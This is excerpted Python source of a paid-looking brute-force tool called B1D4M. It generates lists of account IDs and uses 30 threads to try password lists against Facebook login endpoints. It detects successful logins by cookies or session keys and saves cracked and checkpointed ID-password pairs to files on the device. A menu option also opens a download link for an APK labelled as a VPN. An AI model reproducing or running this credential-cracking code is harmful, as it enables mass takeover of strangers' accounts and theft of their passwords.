...
______ ___________  ___  ___  ___
| ___ \_   _|  _  \/ _ \ |  \/  |
| |_/ / | | | | | / /_\ \| .  . |
| ___ \ | | | | | |  _  || |\/| |
| |_/ /_| |_| |/ /| | | || |  | |
...
\033[0;37m════════════════════════════════════════\033[0;37m
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m AUTHOR    : b_b1d4m
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m GITHUB    : FUCK🫵
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m TOOL TYPE : 10$
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m VERSION   : 5.0.0
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m TELEGRAM  : b_b1d4m'"""'')
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/B1D4M_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ...
                                B1D4M.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as B1D4M:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [B-B1D4M] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        B1D4M=session.cookies.get_dict().keys()
                        if "c_user" in B1D4M:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [B1D4M-OK] %s | %s'%(ids,pas))
                                open('/sdcard/B1D4M-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [B1D4M-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B1D4M-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [B1D4M-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B1D4M-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/B1D4M-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [B1D4M-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/B1D4M-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [B1D4M-OK] '+uid+' | '+pas+'\033[1;97m')
